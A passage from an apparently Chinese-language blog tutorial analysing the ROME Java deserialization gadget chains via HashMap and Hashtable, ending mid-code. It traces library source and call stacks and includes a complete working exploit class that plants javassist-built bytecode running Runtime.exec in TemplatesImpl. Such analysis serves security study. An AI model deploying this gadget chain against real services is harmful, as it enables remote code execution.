ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">50</span>, ObjectBeanExp (RomeSec)</span><br></pre></td></tr></table></figure>

<h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>注：调试分析的时候只需要保留反序列化部分的代码即可<br>从HashMap的readObject方法开始<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231123205929.png"></p>
<p>这里的key是ObjectBean对象，这就是exp中向HashMap对象put objectBean对象的原因，这样key就是objectBean对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建hashMap</span></span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(objectBean, <span class="string">&quot;aaaa&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>为什么key需要是objectBean对象，进入hash函数<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231123210543.png"></p>
<p>key为objectBean对象，调用其hashCode方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231123210814.png"></p>
<p><strong>问题一</strong>：这里的_equalsBeans是EqualsBean对象，如何得来？<br>进入EqualsBean的beanHashCode方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231123211159.png"></p>
<p><strong>问题二</strong>：这里的EqualsBean对象的_obj是ToStringBean对象，如何得来？</p>
<p>进入ToStringBean的toString方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Stack</span> <span class="variable">stack</span> <span class="operator">=</span> (Stack)PREFIX_TL.get();</span><br><span class="line">    String[] tsInfo = (String[])(stack.isEmpty() ? <span class="literal">null</span> : stack.peek());</span><br><span class="line">    String prefix;</span><br><span class="line">    <span class="keyword">if</span> (tsInfo == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="built_in">this</span>._obj.getClass().getName();</span><br><span class="line">        prefix = className.substring(className.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        prefix = tsInfo[<span class="number">0</span>];</span><br><span class="line">        tsInfo[<span class="number">1</span>] = prefix;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// // 调用重载的 toString 方法，并传入前缀参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.toString(prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231123211738.png"></p>
<p>进入有参数的重载方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">toString</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取对象的属性描述符数组</span></span><br><span class="line">        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="built_in">this</span>._beanClass);</span><br><span class="line">        <span class="keyword">if</span> (pds != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 遍历属性描述符数组</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; pds.length; ++i) &#123;</span><br><span class="line">                <span class="comment">// 获取属性名</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">pName</span> <span class="operator">=</span> pds[i].getName();</span><br><span class="line">                <span class="comment">// 获取属性的读取方法</span></span><br><span class="line">                <span class="type">Method</span> <span class="variable">pReadMethod</span> <span class="operator">=</span> pds[i].getReadMethod();</span><br><span class="line">                <span class="keyword">if</span> (pReadMethod != <span class="literal">null</span> &amp;&amp; pReadMethod.getDeclaringClass() != Object.class &amp;&amp; pReadMethod.getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// 调用属性的读取方法获取属性值</span></span><br><span class="line">                    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> pReadMethod.invoke(<span class="built_in">this</span>._obj, NO_PARAMS);</span><br><span class="line">                    <span class="built_in">this</span>.printProperty(sb, prefix + <span class="string">&quot;.&quot;</span> + pName, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;\n\nEXCEPTION: Could not complete &quot;</span> + <span class="built_in">this</span>._obj.getClass() + <span class="string">&quot;.toString(): &quot;</span> + var8.getMessage() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先观察getPropertyDescriptors方法，这里的this._beanClass为 Class Templates</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> PropertyDescriptor[] getPropertyDescriptors(Class klass) <span class="keyword">throws</span> IntrospectionException &#123;</span><br><span class="line">    PropertyDescriptor[] descriptors = (PropertyDescriptor[])((PropertyDescriptor[])_introspected.get(klass));</span><br><span class="line">    <span class="keyword">if</span> (descriptors == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 这里</span></span><br><span class="line">        descriptors = getPDs(klass);</span><br><span class="line">        _introspected.put(klass, descriptors);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> descriptors;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入getPDs方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> PropertyDescriptor[] getPDs(Class klass) <span class="keyword">throws</span> IntrospectionException &#123;</span><br><span class="line">    <span class="comment">// 获取类的所有方法</span></span><br><span class="line">    Method[] methods = klass.getMethods();</span><br><span class="line">    <span class="comment">// 获取所有的读取方法</span></span><br><span class="line">    <span class="type">Map</span> <span class="variable">getters</span> <span class="operator">=</span> getPDs(methods, <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// 获取所有的写入方法</span></span><br><span class="line">    <span class="type">Map</span> <span class="variable">setters</span> <span class="operator">=</span> getPDs(methods, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 合并读取方法和写入方法的结果</span></span><br><span class="line">    <span class="type">List</span> <span class="variable">pds</span> <span class="operator">=</span> merge(getters, setters);</span><br><span class="line">    PropertyDescriptor[] array = <span class="keyword">new</span> <span class="title class_">PropertyDescriptor</span>[pds.size()];</span><br><span class="line">    pds.toArray(array);</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入重载的getPDs方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Map <span class="title function_">getPDs</span><span class="params">(Method[] methods, <span class="type">boolean</span> setters)</span> <span class="keyword">throws</span> IntrospectionException &#123;</span><br><span class="line">    <span class="type">Map</span> <span class="variable">pds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="comment">// 遍历方法数组</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methods.length; ++i) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">pName</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">PropertyDescriptor</span> <span class="variable">pDescriptor</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 检查方法是否为公共方法</span></span><br><span class="line">        <span class="keyword">if</span> ((methods[i].getModifiers() &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果 setters 参数为 true，处理写入方法</span></span><br><span class="line">            <span class="keyword">if</span> (setters) &#123;</span><br><span class="line">                <span class="comment">// 检查方法名是否以 &quot;set&quot; 开头，返回类型为 void，且参数个数为 1</span></span><br><span class="line">                <span class="keyword">if</span> (methods[i].getName().startsWith(<span class="string">&quot;set&quot;</span>) &amp;&amp; methods[i].getReturnType() == Void.TYPE &amp;&amp; methods[i].getParameterTypes().length == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="comment">// 获取属性名</span></span><br><span class="line">                    pName = Introspector.decapitalize(methods[i].getName().substring(<span class="number">3</span>));</span><br><span class="line">                    <span class="comment">// 创建属性描述符，使用 null 作为读取方法，当前方法作为写入方法</span></span><br><span class="line">                    pDescriptor = <span class="keyword">new</span> <span class="title class_">PropertyDescriptor</span>(pName, (Method)<span class="literal">null</span>, methods[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">// 如果 setters 参数为 false，处理读取方法</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (methods[i].getName().startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; methods[i].getReturnType() != Void.TYPE &amp;&amp; methods[i].getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 检查方法名是否以 &quot;get&quot; 开头，返回类型不为 void，且参数个数为 0</span></span><br><span class="line">                pName = Introspector.decapitalize(methods[i].getName().substring(<span class="number">3</span>));</span><br><span class="line">                pDescriptor = <span class="keyword">new</span> <span class="title class_">PropertyDescriptor</span>(pName, methods[i], (Method)<span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 检查方法名是否以 &quot;is&quot; 开头，返回类型为 boolean，且参数个数为 0 </span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (methods[i].getName().startsWith(<span class="string">&quot;is&quot;</span>) &amp;&amp; methods[i].getReturnType() == Boolean.TYPE &amp;&amp; methods[i].getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">                pName = Introspector.decapitalize(methods[i].getName().substring(<span class="number">2</span>));</span><br><span class="line">                pDescriptor = <span class="keyword">new</span> <span class="title class_">PropertyDescriptor</span>(pName, methods[i], (Method)<span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pName != <span class="literal">null</span>) &#123;</span><br><span class="line">            pds.put(pName, pDescriptor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回属性描述符的 Map 对象</span></span><br><span class="line">    <span class="keyword">return</span> pds;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后执行完getPDs得到的结果如下：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231123215719.png"><br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getPDs:<span class="number">54</span>, BeanIntrospector (com.sun.syndication.feed.impl)</span><br><span class="line">getPropertyDescriptors:<span class="number">41</span>, BeanIntrospector (com.sun.syndication.feed.impl)</span><br><span class="line">toString:<span class="number">129</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:<span class="number">116</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">193</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hashCode:<span class="number">110</span>, ObjectBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">1397</span>, HashMap (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">50</span>, ObjectBeanExp (RomeSec)</span><br></pre></td></tr></table></figure>

<p>回到ToStringBean中的toString方法，执行完getPropertyDescriptors方法得到的结果就是获取到了TemplatesImpl类的getOutputProperties方法相关信息，继续往下执行<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231123220239.png"><br>然后调用了TemplatesImpl类的getOutputProperties方法，接下来就是TemplatesImpl类的方法调用链</p>
<h2 id="相关问题"><a href="#相关问题" class="headerlink" title="相关问题"></a>相关问题</h2><p><strong>问题一</strong>：_equalsBeans是EqualsBean对象，如何得来？<br>在ObjectBean类中有下面两个构造方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectBean</span><span class="params">(Class beanClass, Object obj)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(beanClass, obj, (Set)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectBean</span><span class="params">(Class beanClass, Object obj, Set ignoreProperties)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>._equalsBean = <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(beanClass, obj);</span><br><span class="line">    <span class="built_in">this</span>._toStringBean = <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(beanClass, obj);</span><br><span class="line">    <span class="built_in">this</span>._cloneableBean = <span class="keyword">new</span> <span class="title class_">CloneableBean</span>(obj, ignoreProperties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看EqualsBean的构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">EqualsBean</span><span class="params">(Class beanClass, Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!beanClass.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(obj.getClass() + <span class="string">&quot; is not instance of &quot;</span> + beanClass);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>._beanClass = beanClass;</span><br><span class="line">        <span class="built_in">this</span>._obj = obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以这里可以得知obj需要是beanClass的实例化对象</p>
<p><strong>问题二</strong>：这里的EqualsBean对象的_obj是ToStringBean对象，如何得来？<br>通过上面的分析可知，EqualsBean的_obj必须是ToStringBean对象，这样才能EqualsBean的beanHashCode方法中调用到ToStringBean的toString方法，因此EqualsBean的_beanClass方法必须是ToStringBean类</p>
<p>因此，根据ObjectBean和EqualsBean的构造方法，可以得如下exp的构造：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建ObjectBean对象</span></span><br><span class="line"><span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">setFiled(objectBean,<span class="string">&quot;_toStringBean&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">setFiled(objectBean, <span class="string">&quot;_cloneableBean&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p><strong>问题三</strong>：这里的ToStringBean对象的_obj是TemplatesImpl对象，如何得来？<br>在ToStringBean的toString方法中，大致意思就是传递一个类，获取该类的set或者get方法，并且能够使用invoke调用，这里就可以利用TemplatesImpl链<br>在如下代码中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> pReadMethod.invoke(<span class="built_in">this</span>._obj, NO_PARAMS);</span><br></pre></td></tr></table></figure>

<p>要执行一个对象的方法，invoke第一个参数就是该对象，因此这里是构造的ToStringBean对象的_obj属性是TemplatesImpl对象</p>
<p>而_beanClass的由来需要看这一句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="built_in">this</span>._beanClass);</span><br></pre></td></tr></table></figure>

<p>getPropertyDescriptors方法的大致作用是获取一个类的get或set方法，这里需要调用TemplatesImpl的getOutputProperties方法，就必须传入对应的类，这里选择传入接口Templates</p>
<p>查看ToStringBean的构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">ToStringBean</span><span class="params">(Class beanClass)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>._beanClass = beanClass;</span><br><span class="line">    <span class="built_in">this</span>._obj = <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ToStringBean</span><span class="params">(Class beanClass, Object obj)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>._beanClass = beanClass;</span><br><span class="line">    <span class="built_in">this</span>._obj = obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>故有如下exp构造</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建ToStringBean对象</span></span><br><span class="line"><span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templateImpl);</span><br></pre></td></tr></table></figure>

<p><strong>注</strong>：当然这里也可以不需要在外面套一层ObjectBean，直接将构造的EqualsBean放入HashMap中也可以</p>
<h1 id="HashTable利用链"><a href="#HashTable利用链" class="headerlink" title="HashTable利用链"></a>HashTable利用链</h1><h2 id="利用链-1"><a href="#利用链-1" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">ObjetBean.hashCode()</span><br><span class="line">HashTable.reconstitutionPut()</span><br><span class="line">HashTable.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure>

<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RomeSec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashTableExp</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建恶意类</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;cccc&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建TemplatesImpl对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">templateImpl</span> <span class="operator">=</span> Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ToStringBean对象</span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templateImpl);</span><br><span class="line">        <span class="comment">// 创建ObjectBean对象</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        setFiled(objectBean,<span class="string">&quot;_toStringBean&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFiled(objectBean, <span class="string">&quot;_cloneableBean&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建HashTable</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(objectBean, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;HashTable.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;HashTable.bin&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFiled</span><span class="params">(Object o, String fieldname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> o.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="函数调用栈-1"><a href="#函数调用栈-1" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">&lt;clinit&gt;:-<span class="number">1</span>, cccc</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">442</span>, Class (java.lang)</span><br><span class="line">getTransletInstance:<span class="number">455</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:<span class="number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">137</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:<span class="number">116</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">193</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hashCode:<span class="number">110</span>, ObjectBean (com.sun.syndication.feed.impl)</span><br><span class="line">reconstitutionPut:<span class="number">1218</span>, Hashtable (java.util)</span><br><span class="line">readObject:<span class="number">1195</span>, Hashtable (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">54</span>, HashTableExp (RomeSec)</span><br></pre></td></tr></table></figure>

<h2 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h2><p>这里和上一条链的区别就是不使用HashMap，选择使用HashTable，但是只要有方法调用了hashCode方法，后面的链就不会发生改变</p>
<p>在HashTable的readObject方法中<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231124144256.png"></p>
<p>进入HashTable的reconstitutionPut方法，这里调用hashCode方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用于在哈希表中插入新条目的方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="comment">// 这里</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> 